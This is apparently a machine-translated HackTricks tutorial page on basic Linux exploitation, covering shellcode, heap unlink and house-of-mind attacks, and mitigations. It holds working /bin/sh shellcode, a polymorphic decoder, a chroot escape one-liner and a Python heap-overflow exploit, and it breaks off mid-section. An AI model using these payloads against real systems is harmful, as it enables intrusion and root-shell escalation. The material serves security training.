# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

Kerneli kesintileri verin: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax'i temizle\
xor ebx, ebx ; ebx = 0 Ã§Ã¼nkÃ¼ geÃ§ilecek argÃ¼man yok\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Syscall'Ä± Ã§alÄ±ÅŸtÄ±r

**nasm -f elf assembly.asm** â€”> Bize bir .o dÃ¶ner\
**ld assembly.o -o shellcodeout** â€”> Bize, assembler kodundan oluÅŸan bir Ã§alÄ±ÅŸtÄ±rÄ±labilir dosya verir ve **objdump** ile opcode'larÄ± alabiliriz\
**objdump -d -Mintel ./shellcodeout** â€”> GerÃ§ekten shellcode'umuz olduÄŸunu gÃ¶rmek ve OpCodes almak iÃ§in

**Shellcode'un Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± kontrol et**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Para sistem Ã§aÄŸrÄ±larÄ±nÄ±n doÄŸru yapÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in yukarÄ±daki programÄ± derlemek ve sistem Ã§aÄŸrÄ±larÄ±nÄ±n **strace ./PROGRAMA\_COMPILADO**'da gÃ¶rÃ¼nmesi gerekir.

Shellcode oluÅŸtururken bir hile yapÄ±labilir. Ä°lk talimat bir Ã§aÄŸrÄ±ya atlamadÄ±r. Ã‡aÄŸrÄ±, orijinal kodu Ã§aÄŸÄ±rÄ±r ve ayrÄ±ca yÄ±ÄŸÄ±na EIP'yi ekler. Ã‡aÄŸrÄ± talimatÄ±ndan sonra ihtiyaÃ§ duyduÄŸumuz dizeyi ekledik, bu nedenle bu EIP ile dizeyi iÅŸaretleyebiliriz ve ayrÄ±ca kodu Ã§alÄ±ÅŸtÄ±rmaya devam edebiliriz.

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**EJ yÄ±ÄŸÄ±nÄ± kullanarak (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Egg Huter:**

Bir sÃ¼recin bellek sayfalarÄ±nÄ± tarayan ve orada saklanan shellcode'u arayan kÃ¼Ã§Ã¼k bir kod parÃ§asÄ±ndan oluÅŸur (shellcode'da yer alan bir imzayÄ± arar). Kod enjekte etmek iÃ§in yalnÄ±zca kÃ¼Ã§Ã¼k bir alanÄ±n bulunduÄŸu durumlarda kullanÄ±ÅŸlÄ±dÄ±r.

**Polimorfik Shellcodlar**

ÅifrelenmiÅŸ shell'lerden oluÅŸur ve bunlarÄ± Ã§Ã¶zen ve ona atlayan kÃ¼Ã§Ã¼k kodlar iÃ§erir, Call-Pop hilesini kullanarak bu bir **cesar ÅŸifreli Ã¶rnek** olur:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5.TamamlayÄ±cÄ± YÃ¶ntemler**

**Murat TekniÄŸi**

Linux'ta tÃ¼m programlar 0xbfffffff adresinden baÅŸlar.

Linux'ta yeni bir sÃ¼recin yÄ±ÄŸÄ±n yapÄ±sÄ±nÄ±n nasÄ±l oluÅŸturulduÄŸunu gÃ¶rmek, bir exploit geliÅŸtirmeyi saÄŸlar; bÃ¶ylece program, yalnÄ±zca shellcode'un bulunduÄŸu bir ortamda baÅŸlatÄ±labilir. Bu durumda adres ÅŸÃ¶yle hesaplanabilir: addr = 0xbfffffff - 4 - strlen(TAM\_EXECUTABLE\_ADI) - strlen(shellcode)

Bu ÅŸekilde, shellcode'un bulunduÄŸu ortam deÄŸiÅŸkeninin adresi kolayca elde edilebilir.

Bunu yapmak mÃ¼mkÃ¼ndÃ¼r Ã§Ã¼nkÃ¼ execle fonksiyonu, yalnÄ±zca istenen ortam deÄŸiÅŸkenlerini iÃ§eren bir ortam oluÅŸturulmasÄ±na izin verir.

###

### **Format Strings to Buffer Overflows**

**sprintf**, biÃ§imlendirilmiÅŸ bir dizeyi bir **deÄŸiÅŸkene** **taÅŸÄ±r.** Bu nedenle, bir dize biÃ§imlendirmesini kÃ¶tÃ¼ye kullanarak, iÃ§eriÄŸin kopyalandÄ±ÄŸÄ± **deÄŸiÅŸkende bir buffer overflow** oluÅŸturabilirsiniz.\
Ã–rneÄŸin, `%.44xAAAA` yÃ¼kÃ¼, **deÄŸiÅŸkende 44B+"AAAA" yazacaktÄ±r**, bu da bir buffer overflow'a neden olabilir.

### **\_\_atexit YapÄ±larÄ±**

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde bunu istismar etmek Ã§ok **garip**.
{% endhint %}

**`atexit()`**, **diÄŸer fonksiyonlarÄ±n parametre olarak geÃ§irildiÄŸi** bir fonksiyondur. Bu **fonksiyonlar**, **`exit()`** veya **main**'in **dÃ¶nÃ¼ÅŸÃ¼** sÄ±rasÄ±nda **Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r**.\
EÄŸer bu **fonksiyonlardan** herhangi birinin **adresini** shellcode'a iÅŸaret edecek ÅŸekilde **deÄŸiÅŸtirebilirseniz**, **sÃ¼recin kontrolÃ¼nÃ¼** ele geÃ§irebilirsiniz, ancak bu ÅŸu anda daha karmaÅŸÄ±k.\
Åu anda, Ã§alÄ±ÅŸtÄ±rÄ±lacak **fonksiyonlarÄ±n adresleri**, birkaÃ§ yapÄ± arkasÄ±nda **gizlidir** ve nihayetinde iÅŸaret ettikleri adresler, fonksiyonlarÄ±n adresleri deÄŸil, **XOR ile ÅŸifrelenmiÅŸ** ve **rastgele bir anahtar** ile kaydÄ±rÄ±lmÄ±ÅŸtÄ±r. Bu nedenle, ÅŸu anda bu saldÄ±rÄ± vektÃ¶rÃ¼ **en azÄ±ndan x86** ve **x64\_86** Ã¼zerinde **Ã§ok kullanÄ±ÅŸlÄ± deÄŸildir**.\
**Åifreleme fonksiyonu** **`PTR_MANGLE`**'dir. **m68k, mips32, mips64, aarch64, arm, hppa** gibi **diÄŸer mimariler**, **ÅŸifreleme** fonksiyonunu **uygulamaz** Ã§Ã¼nkÃ¼ bu fonksiyon, aldÄ±ÄŸÄ± girdi ile aynÄ± deÄŸeri dÃ¶ndÃ¼rÃ¼r. Bu nedenle, bu mimariler bu vektÃ¶rle saldÄ±rÄ±ya uÄŸrayabilir.

### **setjmp() & longjmp()**

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde bunu istismar etmek Ã§ok **garip**.
{% endhint %}

**`setjmp()`**, **baÄŸlamÄ±** (kayÄ±tlarÄ±) **kaydetmeye** olanak tanÄ±r.\
**`longjmp()`**, **baÄŸlamÄ±** **geri yÃ¼klemeye** olanak tanÄ±r.\
**Kaydedilen kayÄ±tlar**: `EBX, ESI, EDI, ESP, EIP, EBP`\
Olan ÅŸey, EIP ve ESP'nin **`PTR_MANGLE`** fonksiyonu tarafÄ±ndan geÃ§ildiÄŸidir, bu nedenle **bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z mimariler yukarÄ±daki ile aynÄ±dÄ±r**.\
Hata kurtarma veya kesintiler iÃ§in kullanÄ±ÅŸlÄ±dÄ±r.\
Ancak, okuduÄŸum kadarÄ±yla, diÄŸer kayÄ±tlar korunmamÄ±ÅŸtÄ±r, **bu nedenle eÄŸer Ã§aÄŸrÄ±lan fonksiyon iÃ§inde `call ebx`, `call esi` veya `call edi` varsa**, kontrol ele geÃ§irilebilir. Ya da EBP'yi deÄŸiÅŸtirerek ESP'yi de deÄŸiÅŸtirebilirsiniz.

**C++'da VTable ve VPTR**

Her sÄ±nÄ±fÄ±n bir **Vtable**'Ä± vardÄ±r; bu, **metotlara iÅŸaret eden** bir dizidir.

Her **sÄ±nÄ±f** nesnesinin bir **VPtr**'Ä± vardÄ±r; bu, sÄ±nÄ±fÄ±nÄ±n dizisine iÅŸaret eden bir **iÅŸaretÃ§idir**. VPtr, her nesnenin baÅŸlÄ±ÄŸÄ±nÄ±n bir parÃ§asÄ±dÄ±r, bu nedenle bir **VPtr**'Ä±n **aÅŸÄ±rÄ± yazÄ±lmasÄ±** saÄŸlanÄ±rsa, bir sahte metoda **iÅŸaret edecek ÅŸekilde** **deÄŸiÅŸtirilebilir**, bÃ¶ylece bir fonksiyon Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda shellcode'a yÃ¶nlendirilir.

## **Ã–nleyici Tedbirler ve KaÃ§Ä±ÅŸlar**

###

**Libsafe DeÄŸiÅŸtirme**

Åu ÅŸekilde etkinleÅŸtirilir: LD\_PRELOAD=/lib/libsafe.so.2\
veya\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

GÃ¼vensiz bazÄ± fonksiyon Ã§aÄŸrÄ±larÄ±, gÃ¼venli olanlarla deÄŸiÅŸtirilir. Standart deÄŸildir. (sadece x86 iÃ§in, -fomit-frame-pointer ile derlenmiÅŸler iÃ§in deÄŸil, statik derlemeler iÃ§in deÄŸil, tÃ¼m savunmasÄ±z fonksiyonlar gÃ¼venli hale gelmez ve LD\_PRELOAD, suid ile olan ikili dosyalarda iÅŸe yaramaz).

**ASCII DonanÄ±mlÄ± Adres AlanÄ±**

0x00000000 ile 0x00ffffff arasÄ±nda paylaÅŸÄ±lan kÃ¼tÃ¼phaneleri yÃ¼klemeyi iÃ§erir, bÃ¶ylece her zaman bir 0x00 baytÄ± bulunur. Ancak, bu gerÃ§ekten neredeyse hiÃ§bir saldÄ±rÄ±yÄ± durdurmaz, Ã¶zellikle little endian'da.

**ret2plt**

Bir ROP gerÃ§ekleÅŸtirerek strcpy@plt (plt'den) fonksiyonunu Ã§aÄŸÄ±rmayÄ± ve GOT'taki giriÅŸe iÅŸaret etmeyi ve Ã§aÄŸrÄ±lmak istenen fonksiyonun ilk baytÄ±nÄ± (system()) kopyalamayÄ± iÃ§erir. ArdÄ±ndan, GOT+1'e iÅŸaret ederek system()'in 2. baytÄ±nÄ± kopyalar... Sonunda, system()'in adresini saklayarak GOT'ta Ã§aÄŸrÄ±lÄ±r.

**chroot() ile Kafesler**

debootstrap -arch=i386 hardy /home/user â€”> Belirli bir alt dizin altÄ±nda temel bir sistem kurar.

Bir yÃ¶netici, bunlardan birinden Ã§Ä±kmak iÃ§in: mkdir foo; chroot foo; cd ..

**Kod EnstrÃ¼mantasyonu**

Valgrind â€”> HatalarÄ± arar\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 YÄ±ÄŸÄ±n TaÅŸmalarÄ±: Temel Exploitler**

**Atanan ParÃ§a**

prev\_size |\
size | â€”BaÅŸlÄ±k\
\*mem | Veriler

**BoÅŸ ParÃ§a**

prev\_size |\
size |\
\*fd | Ä°leri parÃ§a iÅŸaretÃ§isi\
\*bk | Geri parÃ§a iÅŸaretÃ§isi â€”BaÅŸlÄ±k\
\*mem | Veriler

BoÅŸ parÃ§alar, Ã§ift baÄŸlÄ± bir listede (bin) bulunur ve asla yan yana iki boÅŸ parÃ§a olamaz (birleÅŸirler).

â€œsizeâ€ iÃ§inde, Ã¶nceki parÃ§anÄ±n kullanÄ±lÄ±p kullanÄ±lmadÄ±ÄŸÄ±nÄ±, parÃ§anÄ±n mmap() ile atanÄ±p atanmadÄ±ÄŸÄ±nÄ± ve parÃ§anÄ±n ana arenaya ait olup olmadÄ±ÄŸÄ±nÄ± belirten bitler vardÄ±r.

EÄŸer bir parÃ§ayÄ± serbest bÄ±raktÄ±ÄŸÄ±nÄ±zda, komÅŸulardan biri boÅŸsa, bunlar unlink() makrosu ile birleÅŸtirilir ve yeni daha bÃ¼yÃ¼k parÃ§a frontlink()'e geÃ§irilir, bÃ¶ylece uygun bin'e eklenir.

unlink(){\
BK = P->bk; â€”> Yeni parÃ§anÄ±n BK'si, daha Ã¶nce boÅŸ olan parÃ§anÄ±n BK'sidir.\
FD = P->fd; â€”> Yeni parÃ§anÄ±n FD'si, daha Ã¶nce boÅŸ olan parÃ§anÄ±n FD'sidir.\
FD->bk = BK; â€”> Sonraki parÃ§anÄ±n BK'si yeni parÃ§aya iÅŸaret eder.\
BK->fd = FD; â€”> Ã–nceki parÃ§anÄ±n FD'si yeni parÃ§aya iÅŸaret eder.\
}

Bu nedenle, eÄŸer P->bk'yi bir shellcode adresi ile ve P->fd'yi GOT veya DTORS'taki bir giriÅŸin adresi ile -12 ile deÄŸiÅŸtirirsek:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Ve bÃ¶ylece programdan Ã§Ä±karken shellcode Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.

AyrÄ±ca, unlink()'in 4. ifadesi bir ÅŸey yazar ve shellcode bunun iÃ§in onarÄ±lmalÄ±dÄ±r:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> Bu, shellcode'un 8. baytÄ±ndan itibaren 4 bayt yazÄ±lmasÄ±na neden olur, bu nedenle shellcode'un ilk talimatÄ±, bunu atlamak ve geri kalan shellcode'a ulaÅŸmak iÃ§in bir jmp olmalÄ±dÄ±r.

Bu nedenle exploit ÅŸÃ¶yle oluÅŸturulur:

buffer1'e shellcode'u, nops'a dÃ¼ÅŸecek bir jmp ile baÅŸlarÄ±z.

Shellcode'dan sonra, bir Ã¶nceki parÃ§anÄ±n prev\_size ve size alanÄ±na kadar dolgu ekleriz. Bu alanlara 0xfffffff0 (Ã¶nceki parÃ§anÄ±n boÅŸ olduÄŸunu belirten biti ayarlamak iÃ§in) ve â€œ-4â€œ(0xfffffffc) ekleriz (3. parÃ§anÄ±n 2. parÃ§anÄ±n gerÃ§ekten boÅŸ olup olmadÄ±ÄŸÄ±nÄ± kontrol ettiÄŸinde, ona boÅŸ olduÄŸunu sÃ¶yleyen deÄŸiÅŸtirilmiÅŸ prev\_size'a gidecektir) -> BÃ¶ylece free() araÅŸtÄ±rdÄ±ÄŸÄ±nda, 3. parÃ§anÄ±n boyutuna gidecek, ancak aslÄ±nda 2. parÃ§aya -4 gidecek ve 2. parÃ§anÄ±n boÅŸ olduÄŸunu dÃ¼ÅŸÃ¼necektir. Ve ardÄ±ndan **unlink()**'i Ã§aÄŸÄ±racaktÄ±r.

unlink() Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, P->fd olarak 2. parÃ§anÄ±n ilk verilerini kullanacak, bu nedenle oraya yazmak istediÄŸiniz adresi -12 (Ã§Ã¼nkÃ¼ FD->bk, FD'deki saklanan adrese 12 ekleyecektir) yerleÅŸtirecektir. Ve bu adrese, 2. parÃ§adaki ikinci adresi yerleÅŸtirecektir, bu da shellcode'a iÅŸaret etmesini istediÄŸimiz adrestir (sahte P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bayt dolgu**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Ã–nceki parÃ§anÄ±n boÅŸ olduÄŸunu belirten bitin 1 olmasÄ± gerekir.**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, bÃ¶ylece 3. parÃ§anÄ±n â€œsizeâ€Ä± 4 bayt geride olduÄŸunu dÃ¼ÅŸÃ¼nÃ¼r (prev\_size'a iÅŸaret eder) Ã§Ã¼nkÃ¼ burada 2. parÃ§anÄ±n boÅŸ olup olmadÄ±ÄŸÄ±nÄ± kontrol eder.**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #YÃ¼kÃ¼n baÅŸÄ±nda 8 bayt dolgu ekleyeceÄŸiz.**

**got\_free = pack("\<I", 0x08048300 - 12) #free() adresi plt'de -12 (shellcode'u Ã§alÄ±ÅŸtÄ±rmak iÃ§in 2. kez free() Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda yazÄ±lacak adres).**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Daha Ã¶nce belirtildiÄŸi gibi, yÃ¼k 8 bayt dolgu ile baÅŸlar.**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2. parÃ§ayÄ± deÄŸiÅŸtiriyoruz, got\_free, addr\_sc + 12 adresini saklayacaÄŸÄ±mÄ±z yere iÅŸaret ediyor.**

**os.system("./8.3.o " + payload)**

**unset() tersine serbest bÄ±rakma (wargame)**

ÃœÃ§ ardÄ±ÅŸÄ±k parÃ§ayÄ± kontrol ediyoruz ve bunlar, ayrÄ±ldÄ±klarÄ± sÄ±ranÄ±n tersine serbest bÄ±rakÄ±lÄ±yor.

Bu durumda:

c parÃ§asÄ±na shellcode yerleÅŸtiriyoruz.

a parÃ§asÄ±nÄ±, b parÃ§asÄ±nÄ± Ã¶yle bir ÅŸekilde aÅŸÄ±rÄ± yazmak iÃ§in kullanÄ±yoruz ki, size alanÄ±nda PREV\_INUSE bitinin devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ±nÄ± saÄŸlÄ±yoruz, bÃ¶ylece a parÃ§asÄ±nÄ±n boÅŸ olduÄŸunu dÃ¼ÅŸÃ¼nÃ¼r.

AyrÄ±ca, b baÅŸlÄ±ÄŸÄ±nda size'Ä± -4 olacak ÅŸekilde aÅŸÄ±rÄ± yazÄ±yoruz.

BÃ¶ylece program, â€œaâ€nÄ±n boÅŸ olduÄŸunu dÃ¼ÅŸÃ¼necek ve bir bin iÃ§inde olacak, bu nedenle unlink() Ã§aÄŸÄ±racaktÄ±r. Ancak, PREV\_SIZE baÅŸlÄ±ÄŸÄ± -4 olduÄŸundan, â€œaâ€ parÃ§asÄ±nÄ±n aslÄ±nda b+4'te baÅŸladÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼necektir. Yani, b+4'te bir unlink() yapacak, bu nedenle b+12'de fd iÅŸaretÃ§isi ve b+16'da bk iÅŸaretÃ§isi olacaktÄ±r.

Bu ÅŸekilde, bk'ye shellcode adresini ve fd'ye puts() adresini -12 yerleÅŸtirirsek, yÃ¼kÃ¼mÃ¼zÃ¼ elde ederiz.

**Frontlink TekniÄŸi**

Frontlink, bir ÅŸey serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda ve komÅŸu parÃ§alarÄ±n hiÃ§biri boÅŸ deÄŸilse Ã§aÄŸrÄ±lÄ±r, unlink() Ã§aÄŸrÄ±lmaz, doÄŸrudan frontlink() Ã§aÄŸrÄ±lÄ±r.

KullanÄ±ÅŸlÄ± bir zafiyet, saldÄ±rÄ±ya uÄŸrayan malloc'un asla serbest bÄ±rakÄ±lmadÄ±ÄŸÄ± durumdur (free()).

Gerektirir:

* GiriÅŸ verileri ile taÅŸma yapabilecek bir buffer
* Bu buffer'a bitiÅŸik bir buffer, serbest bÄ±rakÄ±lacak ve Ã¶nceki buffer'Ä±n taÅŸmasÄ± sayesinde baÅŸlÄ±ÄŸÄ±ndaki fd alanÄ± deÄŸiÅŸtirilecektir.
* Boyutu 512'den bÃ¼yÃ¼k ama Ã¶nceki buffer'dan kÃ¼Ã§Ã¼k bir buffer
* Bu adÄ±m 3'ten Ã¶nce tanÄ±mlanmÄ±ÅŸ bir buffer, bu buffer'Ä±n prev\_size'Ä±nÄ± aÅŸÄ±rÄ± yazmaya izin verir.

Bu ÅŸekilde, iki malloc'ta kontrolsÃ¼z bir ÅŸekilde ve birinde kontrollÃ¼ bir ÅŸekilde aÅŸÄ±rÄ± yazmayÄ± baÅŸardÄ±ÄŸÄ±mÄ±zda, bir exploit oluÅŸturabiliriz.

**double free() Zafiyeti**

EÄŸer aynÄ± iÅŸaretÃ§i ile free() iki kez Ã§aÄŸrÄ±lÄ±rsa, iki bin aynÄ± adrese iÅŸaret eder.

Birini yeniden kullanmak isterseniz, sorun olmadan atanÄ±r. DiÄŸerini kullanmak isterseniz, aynÄ± alan atanÄ±r, bu nedenle fd ve bk iÅŸaretÃ§ileri, Ã¶nceki rezervasyonun yazacaÄŸÄ± verilerle sahte olur.

**After free()**

Daha Ã¶nce serbest bÄ±rakÄ±lmÄ±ÅŸ bir iÅŸaretÃ§i, kontrolsÃ¼z bir ÅŸekilde yeniden kullanÄ±lÄ±r.

## **8 YÄ±ÄŸÄ±n TaÅŸmalarÄ±: Ä°leri DÃ¼zey Exploitler**

Unlink() ve FrontLink() teknikleri, unlink() fonksiyonu deÄŸiÅŸtirilerek kaldÄ±rÄ±ldÄ±.

**The house of mind**

Arbitrary kodun yÃ¼rÃ¼tÃ¼lmesini saÄŸlamak iÃ§in yalnÄ±zca bir free() Ã§aÄŸrÄ±sÄ± gereklidir. Ä°lgili bir ikinci parÃ§ayÄ± aramak Ã¶nemlidir; bu parÃ§a, bir Ã¶nceki parÃ§a tarafÄ±ndan taÅŸma yapÄ±labilir ve serbest bÄ±rakÄ±labilir.

Bir free() Ã§aÄŸrÄ±sÄ±, public\_fREe(mem) Ã§aÄŸrÄ±sÄ±nÄ± tetikler, bu da:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mem); â€”> ParÃ§anÄ±n baÅŸladÄ±ÄŸÄ± adrese iÅŸaret eden bir iÅŸaretÃ§i dÃ¶ndÃ¼rÃ¼r (mem-8)

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

\[1\] iÃ§inde, size alanÄ±nÄ± kontrol eder, NON\_MAIN\_ARENA bitini, bu bitin deÄŸiÅŸtirilmesi, kontrolÃ¼n true dÃ¶ndÃ¼rmesini ve heap\_for\_ptr()'i Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ± saÄŸlar; bu da â€œmemâ€ Ã¼zerinde bir and iÅŸlemi yaparak en az Ã¶nemli 2.5 baytÄ± sÄ±fÄ±ra indirir (bu durumda 0x0804a000'dan 0x08000000'a dÃ¼ÅŸer) ve 0x08000000->ar\_ptr'a eriÅŸir (sanki bir struct heap\_info'muÅŸ gibi).

Bu ÅŸekilde, Ã¶rneÄŸin 0x0804a000'da bir parÃ§ayÄ± kontrol edebiliyorsak ve 0x081002a0'da bir parÃ§a serbest bÄ±rakÄ±lacaksa, 0x08100000 adresine ulaÅŸabilir ve istediÄŸimiz ÅŸeyi yazabiliriz, Ã¶rneÄŸin **0x0804a000**. Bu ikinci parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda, heap\_for\_ptr(ptr)->ar\_ptr, 0x08100000'da yazdÄ±ÄŸÄ±mÄ±zÄ± dÃ¶ndÃ¼recektir (Ã§Ã¼nkÃ¼ daha Ã¶nce gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z and iÅŸlemi 0x081002a0'a uygulanÄ±r ve buradan ilk 4 baytÄ±n deÄŸeri, ar\_ptr olarak alÄ±nÄ±r).

Bu ÅŸekilde, \_int\_free(ar\_ptr, mem) Ã§aÄŸrÄ±lÄ±r, yani **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Daha Ã¶nce gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, av deÄŸerini kontrol edebiliriz, Ã§Ã¼nkÃ¼ serbest bÄ±rakÄ±lacak parÃ§ada yazdÄ±ÄŸÄ±mÄ±z ÅŸeydir.

Unsorted\_chunks tanÄ±mÄ±na gÃ¶re, ÅŸunu biliyoruz:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Bu nedenle, av->bins\[2]'ye \_\_DTOR\_END\_\_-12 deÄŸerini yazarsak, son talimat, \_\_DTOR\_END\_\_ adresini yazacaktÄ±r.

Yani, ilk parÃ§ada, birÃ§ok kez \_\_DTOR\_END\_\_-12 adresini baÅŸa koymalÄ±yÄ±z, Ã§Ã¼nkÃ¼ av->bins\[2] oradan alacaktÄ±r.

Ä°kinci parÃ§anÄ±n adresine, son 5 sÄ±fÄ±rla birlikte, bu ilk parÃ§anÄ±n adresini yazmalÄ±yÄ±z, bÃ¶ylece heap\_for\_ptr() ar\_ptr'Ä±n ilk parÃ§anÄ±n baÅŸÄ±nda olduÄŸunu dÃ¼ÅŸÃ¼nÃ¼r ve oradan av->bins\[2]'yi alÄ±r.

Ä°kinci parÃ§ada ve birinciden dolayÄ±, prev\_size'Ä± 0x0c ile ve size'Ä± NON\_MAIN\_ARENA'yÄ± etkinleÅŸtirecek ÅŸekilde aÅŸÄ±rÄ± yazÄ±yoruz.

ArdÄ±ndan, 2. parÃ§aya bir sÃ¼rÃ¼ nop koyuyoruz ve sonunda shellcode'u yerleÅŸtiriyoruz.

Bu ÅŸekilde, \_int\_free(TROZO1, TROZO2) Ã§aÄŸrÄ±lÄ±r ve talimatlarÄ± izleyerek \_\_DTOR\_END\_\_ adresine TROZO2'nin prev\_size'Ä±nÄ± yazar, bu da shellcode'a atlayacaktÄ±r.

Bu tekniÄŸi uygulamak iÃ§in, payload'u biraz daha karmaÅŸÄ±klaÅŸtÄ±ran bazÄ± gereksinimlerin karÅŸÄ±lanmasÄ± gerekir.

Bu teknik artÄ±k uygulanamaz Ã§Ã¼nkÃ¼ unlink iÃ§in neredeyse aynÄ± yamanÄ±n uygulandÄ±ÄŸÄ± gÃ¶rÃ¼ldÃ¼. Yeni iÅŸaret edilen yerin de kendisine iÅŸaret edip etmediÄŸi kontrol edilir.

**Fastbin**

The house of mind'Ä±n bir varyantÄ±dÄ±r.

AÅŸaÄŸÄ±daki kodu yÃ¼rÃ¼tmek iÃ§in, ilk kontrolÃ¼ geÃ§tikten sonra ulaÅŸmak Ã¶nemlidir:

